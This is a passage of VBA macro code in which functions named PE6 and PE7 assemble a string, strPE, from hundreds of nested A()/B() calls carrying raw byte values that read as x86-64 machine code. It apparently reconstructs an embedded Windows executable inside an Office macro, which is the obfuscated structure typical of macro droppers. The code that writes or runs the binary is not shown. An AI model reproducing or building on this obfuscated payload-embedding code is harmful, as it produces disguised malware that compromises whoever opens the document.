    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "A"), 199), "D$"), 12), 255), 255), 255), 255), 233), 154), 252), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 226), 185), "+"), 0), 0), 0), 232), "s"), 229), 255), 255), 233), 153), 252), 255), 255), "f"), 15), 31), "D"), 0), 0), 131), 198)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 1), 233), 198), 253), 255), 255), "L"), 137), 226), 185), " "), 0), 0), 0), 232), "S"), 229), 255), 255), 233), "y"), 252), 255), 255), "f"), 15), 31), "D"), 0), 0), "A"), 141), "B"), 255), "A"), 137), "D$"), 12), "E"), 133), 210), 15), 142), "F"), 252), 255), 255), "f"), 15)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "L"), 137), 226), 185), " "), 0), 0), 0), 232), "#"), 229), 255), 255), "A"), 139), "D$"), 12), 141), "P"), 255), "A"), 137), "T$"), 12), 133), 192), 127), 226), "A"), 139), "L$"), 8), 233), 24), 252), 255), 255), 15), 31), 132), 0), 0), 0)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "H"), 137), 248), 246), 197), 8), 15), 132), "`"), 251), 255), 255), 233), "Q"), 251), 255), 255), 190), 2), 192), 255), 255), 233), "o"), 254), 255), 255), 15), 31), "D"), 0), 0), "AWAVAUATUWVSH"), 129), 236), 168)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), "L"), 139), 164), "$"), 16), 1), 0), 0), 137), 207), "H"), 137), 213), "D"), 137), 195), "L"), 137), 206), 232), 245), "1"), 0), 0), 15), 190), 14), "1"), 210), 129), 231), 0), "`"), 0), 0), 139), 0), "f"), 137), 148), "$"), 144), 0), 0), 0), 137), 156)
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "$"), 152), 0), 0), 0), 137), 202), "H"), 141), "^"), 1), 137), "D$,H"), 184), 255), 255), 255), 255), 253), 255), 255), 255), "H"), 137), 132), "$"), 128), 0), 0), 0), "1"), 192), "H"), 137), "l$p"), 137), "|$x"), 199), "D$|"), 255), 255)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 255), 255), "f"), 137), 132), "$"), 136), 0), 0), 0), 199), 132), "$"), 140), 0), 0), 0), 0), 0), 0), 0), 199), 132), "$"), 148), 0), 0), 0), 0), 0), 0), 0), 199), 132), "$"), 156), 0), 0), 0), 255), 255), 255), 255), 133), 201), 15), 132), "0"), 1), 0)
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(strPE, 0), "L"), 141), "-"), 34), "]"), 0), 0), 235), "_D"), 139), "D$xA"), 247), 192), 0), "@"), 0), 0), "u"), 16), 139), 132), "$"), 148), 0), 0), 0), "9"), 132), "$"), 152), 0), 0), 0), "~%A"), 129), 224), 0), " "), 0), 0), "L"), 139), "L")
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "$p"), 15), 133), 128), 0), 0), 0), "Hc"), 132), "$"), 148), 0), 0), 0), "A"), 136), 20), 1), 139), 132), "$"), 148), 0), 0), 0), 131), 192), 1), 137), 132), "$"), 148), 0), 0), 0), 15), 182), 19), "H"), 131), 195), 1), 15), 190), 202), 133), 201), 15)
    strPE = A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 132), 193), 0), 0), 0), 131), 249), "%u"), 156), 15), 182), 3), 137), "|$xH"), 199), "D$|"), 255), 255), 255), 255), 132), 192), 15), 132), 164), 0), 0), 0), "H"), 137), 222), "L"), 141), "T$|E1"), 255), "E1"), 246), "A"), 187)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 3), 0), 0), 0), 141), "P"), 224), "H"), 141), "n"), 1), 15), 190), 200), 128), 250), "Zw)"), 15), 182), 210), "IcT"), 149), 0), "L"), 1), 234), 255), 226), 15), 31), "@"), 0), "L"), 137), 202), 232), 128), "0"), 0), 0), 139), 132), "$"), 148), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 233), 127), 255), 255), 255), 15), 31), "@"), 0), 131), 232), "0<"), 9), 15), 135), 169), 6), 0), 0), "A"), 131), 254), 3), 15), 135), 159), 6), 0), 0), "E"), 133), 246), 15), 133), "j"), 6), 0), 0), "A"), 190), 1), 0), 0), 0), "M"), 133), 210), 15)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 132), 203), 3), 0), 0), "A"), 139), 2), 133), 192), 15), 136), 197), 6), 0), 0), 141), 4), 128), 141), "DA"), 208), "A"), 137), 2), 15), 182), "F"), 1), "H"), 137), 238), 15), 31), 128), 0), 0), 0), 0), 132), 192), 15), 133), "p"), 255), 255), 255), 139), 140)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "$"), 148), 0), 0), 0), 137), 200), "H"), 129), 196), 168), 0), 0), 0), "[^_]A\A]A^A_"), 195), 15), 31), 0), "I"), 141), "\$"), 8), "A"), 131), 255), 3), 15), 132), 200), 6), 0), 0), "E"), 139), 12), "$A")
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(strPE, 131), 255), 2), "t"), 20), "A"), 131), 255), 1), 15), 132), "F"), 6), 0), 0), "A"), 131), 255), 5), "u"), 4), "E"), 15), 182), 201), "L"), 137), "L$`"), 131), 249), "u"), 15), 132), 132), 6), 0), 0), "L"), 141), "D$pL"), 137), 202), "I"), 137), 220)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "H"), 137), 235), 232), 146), 230), 255), 255), 233), 186), 254), 255), 255), 15), 31), "D"), 0), 0), 15), 182), "F"), 1), "A"), 191), 3), 0), 0), 0), "H"), 137), 238), "A"), 190), 4), 0), 0), 0), 233), "h"), 255), 255), 255), 129), "L$x"), 128), 0), 0), 0)
    strPE = B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "I"), 141), "\$"), 8), "A"), 131), 255), 3), 15), 132), "^"), 6), 0), 0), "Ic"), 12), "$A"), 131), 255), 2), "t"), 20), "A"), 131), 255), 1), 15), 132), 220), 5), 0), 0), "A"), 131), 255), 5), "u"), 4), "H"), 15), 190), 201), "H"), 137), "L$`")
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "H"), 137), 200), "H"), 141), "T$pI"), 137), 220), "H"), 137), 235), "H"), 193), 248), "?H"), 137), "D$h"), 232), ":"), 235), 255), 255), 233), "B"), 254), 255), 255), "A"), 131), 239), 2), "I"), 139), 12), "$I"), 141), "\$"), 8), "A"), 131), 255), 1)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 15), 134), 220), 4), 0), 0), "H"), 141), "T$pI"), 137), 220), "H"), 137), 235), 232), 238), 228), 255), 255), 233), 22), 254), 255), 255), "A"), 131), 239), 2), "A"), 139), 4), "$I"), 141), "\$"), 8), 199), 132), "$"), 128), 0), 0), 0), 255), 255), 255)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 255), "A"), 131), 255), 1), 15), 134), 187), 2), 0), 0), "H"), 141), "L$`L"), 141), "D$p"), 136), "D$`I"), 137), 220), 186), 1), 0), 0), 0), "H"), 137), 235), 232), "y"), 227), 255), 255), 233), 209), 253), 255), 255), "I"), 139), 20), "$")
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(strPE, "Hc"), 132), "$"), 148), 0), 0), 0), "I"), 131), 196), 8), "A"), 131), 255), 5), 15), 132), "_"), 5), 0), 0), "A"), 131), 255), 1), 15), 132), 245), 5), 0), 0), "A"), 131), 255), 2), "t"), 10), "A"), 131), 255), 3), 15), 132), ","), 6), 0), 0), 137), 2)
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "H"), 137), 235), 233), 147), 253), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 131), 200), " "), 137), "D$x"), 168), 4), 15), 132), 11), 2), 0), 0), 219), "*H"), 141), "L$@H"), 141), "T$pH"), 137), 235)
    strPE = A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 219), "|$@"), 232), 19), 247), 255), 255), 233), "["), 253), 255), 255), "E"), 133), 246), "u"), 10), "9|$x"), 15), 132), 143), 4), 0), 0), "I"), 139), 20), "$I"), 141), "\$"), 8), "L"), 141), "D$p"), 185), "x"), 0), 0), 0), "H"), 199)
    strPE = A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, "D$h"), 0), 0), 0), 0), "I"), 137), 220), "H"), 137), 235), "H"), 137), "T$`"), 232), 243), 228), 255), 255), 233), 27), 253), 255), 255), 15), 182), "F"), 1), "<6"), 15), 132), "4"), 5), 0), 0), "<3"), 15), 132), ","), 4), 0), 0), "H"), 137)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 238), "A"), 191), 3), 0), 0), 0), "A"), 190), 4), 0), 0), 0), 233), 190), 253), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 131), 200), " "), 137), "D$x"), 168), 4), 15), 132), 219), 1), 0), 0), 219), "*H"), 141), "L")
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "$@H"), 141), "T$pH"), 137), 235), 219), "|$@"), 232), "c"), 243), 255), 255), 233), 187), 252), 255), 255), 15), 182), "F"), 1), "<h"), 15), 132), 174), 4), 0), 0), "H"), 137), 238), "A"), 191), 1), 0), 0), 0), "A"), 190), 4), 0), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 0), 233), "f"), 253), 255), 255), 15), 182), "F"), 1), "<l"), 15), 132), "u"), 4), 0), 0), "H"), 137), 238), "A"), 191), 2), 0), 0), 0), "A"), 190), 4), 0), 0), 0), 233), "F"), 253), 255), 255), 139), "L$,H"), 137), 235), 232), 26), "-"), 0), 0)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "H"), 141), "T$pH"), 137), 193), 232), "5"), 227), 255), 255), 233), "]"), 252), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 131), 200), " "), 137), "D$x"), 168), 4), 15), 132), "}"), 1), 0), 0), 219), "*H"), 141), "L")
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "$@H"), 141), "T$pH"), 137), 235), 219), "|$@"), 232), "}"), 243), 255), 255), 233), "%"), 252), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 131), 200), " "), 137), "D$x"), 168), 4), 15), 132), "}"), 1), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 0), 219), "*H"), 141), "L$@H"), 141), "T$pH"), 137), 235), 219), "|$@"), 232), "5"), 244), 255), 255), 233), 237), 251), 255), 255), 15), 182), "F"), 1), 131), "L$x"), 4), "H"), 137), 238), "A"), 190), 4), 0), 0), 0), 233), 161)
    strPE = A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 252), 255), 255), "E"), 133), 246), "uD"), 15), 182), "F"), 1), 129), "L$x"), 0), 4), 0), 0), "H"), 137), 238), 233), 136), 252), 255), 255), "A"), 131), 254), 1), 15), 134), "6"), 3), 0), 0), 15), 182), "F"), 1), "A"), 190), 4), 0), 0), 0), "H"), 137)
    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 238), 233), "l"), 252), 255), 255), "E"), 133), 246), 15), 133), 144), 2), 0), 0), 129), "L$x"), 0), 2), 0), 0), 15), 31), 0), 15), 182), "F"), 1), "H"), 137), 238), 233), "L"), 252), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 168), 4), 15), 133), 245), 253), 255), 255), "H"), 137), "T$0"), 221), "D$0H"), 141), "T$pH"), 137), 235), "H"), 141), "L$@"), 219), "|$@"), 232), 1), 245), 255), 255), 233), "I"), 251), 255), 255), 199), 132), "$"), 128), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 0), 255), 255), 255), 255), "I"), 141), "\$"), 8), "A"), 139), 4), "$H"), 141), "L$`L"), 141), "D$pI"), 137), 220), 186), 1), 0), 0), 0), "H"), 137), 235), "f"), 137), "D$`"), 232), "Y"), 223), 255), 255), 233), 17), 251), 255), 255)
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 168), 4), 15), 133), "%"), 254), 255), 255), "H"), 137), "T$0"), 221), "D$0H"), 141), "T$pH"), 137), 235), "H"), 141), "L$@"), 219), "|$@"), 232), 129), 241), 255)
    strPE = B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 255), 233), 217), 250), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 168), 4), 15), 133), 131), 254), 255), 255), "H"), 137), "T$0"), 221), "D$0H"), 141), "T$pH"), 137), 235), "H"), 141), "L$@"), 219), "|")
    strPE = B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "$@"), 232), 249), 241), 255), 255), 233), 161), 250), 255), 255), 139), "D$xI"), 139), 20), "$I"), 131), 196), 8), 168), 4), 15), 133), 131), 254), 255), 255), "H"), 137), "T$0"), 221), "D$0H"), 141), "T$pH"), 137), 235), "H")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 141), "L$@"), 219), "|$@"), 232), 177), 242), 255), 255), 233), "i"), 250), 255), 255), "H"), 141), "T$p"), 185), "%"), 0), 0), 0), "H"), 137), 235), 232), ":"), 222), 255), 255), 233), "R"), 250), 255), 255), "E"), 133), 246), 15), 133), 188), 254), 255), 255)
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(strPE, "L"), 141), "L$`L"), 137), "T$8"), 129), "L$x"), 0), 16), 0), 0), "L"), 137), "L$0"), 199), "D$`"), 0), 0), 0), 0), 232), 248), "*"), 0), 0), "L"), 139), "L$0H"), 141), "L$^A"), 184), 16), 0)
    strPE = A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "H"), 139), "P"), 8), 232), 239), ","), 0), 0), "L"), 139), "T$8A"), 187), 3), 0), 0), 0), 133), 192), "~"), 13), 15), 183), "T$^f"), 137), 148), "$"), 144), 0), 0), 0), 137), 132), "$"), 140), 0), 0), 0), 15), 182), "F"), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "H"), 137), 238), 233), 168), 250), 255), 255), "M"), 133), 210), 15), 132), "!"), 254), 255), 255), "A"), 247), 198), 253), 255), 255), 255), 15), 133), 215), 0), 0), 0), "A"), 139), 4), "$I"), 141), "T$"), 8), "A"), 137), 2), 133), 192), 15), 136), 6), 2), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 15), 182), "F"), 1), "I"), 137), 212), "H"), 137), 238), "E1"), 210), 233), "l"), 250), 255), 255), "E"), 133), 246), 15), 133), 11), 254), 255), 255), 129), "L$x"), 0), 1), 0), 0), 233), 254), 253), 255), 255), "E"), 133), 246), 15), 133), 245), 253), 255), 255), 15)
    strPE = A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 182), "F"), 1), 131), "L$x@H"), 137), 238), 233), "<"), 250), 255), 255), "E"), 133), 246), 15), 133), 219), 253), 255), 255), 15), 182), "F"), 1), 129), "L$x"), 0), 8), 0), 0), "H"), 137), 238), 233), 31), 250), 255), 255), "I"), 141), "\$"), 8)

    PE6 = strPE
End Function

Private Function PE7() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "M"), 139), "$$H"), 141), 5), 7), "V"), 0), 0), "M"), 133), 228), "L"), 15), "D"), 224), 139), 132), "$"), 128), 0), 0), 0), 133), 192), 15), 136), "F"), 1), 0), 0), "Hc"), 208), "L"), 137), 225), 232), "v)"), 0), 0), "L"), 137), 225), "H"), 137), 194)
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(strPE, "L"), 141), "D$pI"), 137), 220), 232), "S"), 221), 255), 255), "H"), 137), 235), 233), 8), 249), 255), 255), "A"), 131), 254), 3), "w1"), 185), "0"), 0), 0), 0), "A"), 131), 254), 2), "E"), 15), "D"), 243), 233), 143), 249), 255), 255), 15), 182), "F"), 1), "E")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "1"), 210), "H"), 137), 238), "A"), 190), 4), 0), 0), 0), 233), 166), 249), 255), 255), 128), "~"), 2), "2"), 15), 132), "G"), 1), 0), 0), "H"), 141), "T$p"), 185), "%"), 0), 0), 0), 232), 165), 220), 255), 255), 233), 189), 248), 255), 255), 199), 132), "$"), 128)
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 16), 0), 0), 0), 137), 248), 128), 204), 2), 137), "D$x"), 233), "X"), 251), 255), 255), "E"), 15), 183), 201), "L"), 137), "L$`"), 233), 187), 249), 255), 255), "H"), 15), 191), 201), "H"), 137), "L$`"), 233), "%"), 250), 255), 255), 131)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 233), "0A"), 137), 10), 233), 240), 252), 255), 255), 15), 182), "F"), 1), "A"), 190), 2), 0), 0), 0), "H"), 137), 238), 199), 132), "$"), 128), 0), 0), 0), 0), 0), 0), 0), "L"), 141), 148), "$"), 128), 0), 0), 0), 233), "#"), 249), 255), 255), 136), 2), "H")
    strPE = B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 137), 235), 233), "N"), 248), 255), 255), "H"), 141), "T$pL"), 137), 201), "I"), 137), 220), "H"), 137), 235), 232), "."), 229), 255), 255), 233), "6"), 248), 255), 255), "M"), 139), 12), "$L"), 137), "L$`"), 233), "M"), 249), 255), 255), "I"), 139), 12), "$H")
    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 137), "L$`"), 233), 183), 249), 255), 255), 15), 182), "F"), 2), "A"), 191), 3), 0), 0), 0), "H"), 131), 198), 2), "A"), 190), 4), 0), 0), 0), 233), 204), 248), 255), 255), 15), 182), "F"), 2), "A"), 191), 5), 0), 0), 0), "H"), 131), 198), 2), "A"), 190)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 4), 0), 0), 0), 233), 179), 248), 255), 255), "L"), 137), 225), 232), "c("), 0), 0), 233), 184), 254), 255), 255), 128), "~"), 2), "4"), 15), 133), 0), 255), 255), 255), 15), 182), "F"), 3), "A"), 191), 3), 0), 0), 0), "H"), 131), 198), 3), "A"), 190), 4), 0)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 233), 131), 248), 255), 255), "f"), 137), 2), "H"), 137), 235), 233), 173), 247), 255), 255), "E"), 133), 246), "uB"), 15), 182), "F"), 1), 247), "\$|I"), 137), 212), "H"), 137), 238), 129), "L$x"), 0), 4), 0), 0), "E1"), 210), 233), "U")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 248), 255), 255), 15), 182), "F"), 3), "A"), 191), 2), 0), 0), 0), "H"), 131), 198), 3), "A"), 190), 4), 0), 0), 0), 233), "<"), 248), 255), 255), "H"), 137), 2), "H"), 137), 235), 233), "f"), 247), 255), 255), 199), 132), "$"), 128), 0), 0), 0), 255), 255), 255), 255)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 233), 163), 253), 255), 255), 144), 144), 144), 144), 144), 144), 144), 144), 144), "SH"), 131), 236), " 1"), 219), 131), 249), 27), "~"), 24), 184), 4), 0), 0), 0), 15), 31), 128), 0), 0), 0), 0), 1), 192), 131), 195), 1), 141), "P"), 23), "9"), 202), "|"), 244)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 137), 217), 232), "u"), 27), 0), 0), 137), 24), "H"), 131), 192), 4), "H"), 131), 196), " ["), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "WVSH"), 131), 236), " H"), 137), 206), "H"), 137), 215), "A"), 131), 248), 27), "~e"), 184), 4), 0)
    strPE = A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(strPE, 0), 0), "1"), 219), "f"), 15), 31), "D"), 0), 0), 1), 192), 131), 195), 1), 141), "P"), 23), "A9"), 208), 127), 243), 137), 217), 232), ","), 27), 0), 0), "H"), 141), "V"), 1), 137), 24), 15), 182), 14), "L"), 141), "@"), 4), 136), "H"), 4), "L"), 137), 192), 132)
    strPE = A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(strPE, 201), "t"), 22), 15), 31), "D"), 0), 0), 15), 182), 10), "H"), 131), 192), 1), "H"), 131), 194), 1), 136), 8), 132), 201), "u"), 239), "H"), 133), 255), "t"), 3), "H"), 137), 7), "L"), 137), 192), "H"), 131), 196), " [^_"), 195), 15), 31), "@"), 0), "1"), 219)
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 235), 177), 15), 31), "@"), 0), 186), 1), 0), 0), 0), "H"), 137), 200), 139), "I"), 252), 211), 226), 137), "H"), 4), "H"), 141), "H"), 252), 137), "P"), 8), 233), 196), 27), 0), 0), 15), 31), "@"), 0), "AWAVAUATUWVS")
    strPE = A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(strPE, "H"), 131), 236), "81"), 192), 139), "r"), 20), "I"), 137), 204), "I"), 137), 211), "9q"), 20), 15), 140), 236), 0), 0), 0), 131), 238), 1), "H"), 141), "Z"), 24), "H"), 141), "i"), 24), "1"), 210), "Lc"), 214), "I"), 193), 226), 2), "J"), 141), "<"), 19), "I"), 1)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 234), 139), 7), "E"), 139), 2), 141), "H"), 1), "D"), 137), 192), 247), 241), 137), "D$,A"), 137), 197), "A9"), 200), "r^A"), 137), 199), "I"), 137), 217), "I"), 137), 232), "E1"), 246), "1"), 210), "f."), 15), 31), 132), 0), 0), 0), 0), 0)
